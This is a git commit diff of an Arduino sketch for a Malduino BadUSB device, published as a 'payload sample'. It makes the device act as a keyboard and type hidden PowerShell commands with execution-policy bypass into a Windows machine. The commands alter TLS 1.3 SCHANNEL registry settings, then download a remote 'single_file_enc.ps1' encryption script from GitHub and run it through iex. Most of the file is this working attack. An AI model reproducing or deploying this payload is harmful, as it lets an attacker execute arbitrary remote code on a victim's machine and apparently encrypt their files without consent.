9edee1fd642f46c62554fb7ab42573880be54ed1
Paulo C. Marcon <pcmarcon@gmail.com>
2021-08-01 14:44:03 -0300

    Update and rename single_file_enc_malduino.ini to single_file_enc_malduino.ino

--- single_file_enc_malduino.ino
+++ single_file_enc_malduino.ino
@@ -1,20 +1,19 @@
 /*
-Copyright (c) 2017 Seytonic, Spacehuhn (Licensed under MIT)
-For more information see: github.com/seytonic/malduino
+Copyright (c) 2021, Pauo C. Marcon (Licensed under MIT)
+For more information see: https://github.com/pcmarcon/malduino-payload-sample
 */
 
 #include "Keyboard.h"
 #include "Mouse.h"
 
 #define blinkInterval 50
-#define ledPin 3
+#define ledPin 3            // original malduino hw use ledpin 3 | generic USB ATMEGA32U4 ue ledping 13
 #define buttonPin 6
 
 int defaultDelay = 4;
 int defaultCharDelay = 5;
 int rMin = 0;
 int rMax = 100;
-
 bool ledOn = true;
 
 void typeKey(int key){
@@ -24,23 +23,19 @@ void typeKey(int key){
 }
 
 void setup(){
-  
   pinMode(buttonPin, INPUT_PULLUP);
   pinMode(ledPin, OUTPUT);
   digitalWrite(ledPin, HIGH);
   
   if(digitalRead(buttonPin) == LOW){
-    
     Keyboard.begin();
     Mouse.begin();
     
-    /* ----- Begin-Script -----*/
-    
-    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
-    delay(5000);
+    /* ----- Begin-Payload -----*/
+    delay(1000);            // extra 1s delay, can be adjusted if needed
 
     delay(defaultDelay);
-    Keyboard.print("d:");
+    Keyboard.print("d:");   // change the drive letter here
 
     delay(defaultDelay);
     delay(300);
@@ -48,6 +43,7 @@ void setup(){
     delay(defaultDelay);
     typeKey(KEY_RETURN);
 
+    // change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url    
     delay(defaultDelay);
     Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force) | iex\"");
 
@@ -55,19 +51,13 @@ void setup(){
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | ie");
-
-    delay(defaultDelay);
-    Keyboard.print("x\"");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -For");
-
-    delay(defaultDelay);
-    Keyboard.print("ce) | iex\"");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
@@ -79,19 +69,13 @@ void setup(){
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | ie");
-
-    delay(defaultDelay);
-    Keyboard.print("x\"");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
 
     delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -For");
-
-    delay(defaultDelay);
-    Keyboard.print("ce) | iex\"");
+    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
@@ -102,14 +86,14 @@ void setup(){
     delay(defaultDelay);
     typeKey(KEY_RETURN);
 
+    // run encryption script directly from github
     delay(defaultDelay);
     Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
     
-    /* ----- End-Script -----*/
-    
+    /* ----- End-Payload -----*/
     Keyboard.end();
   }
 }
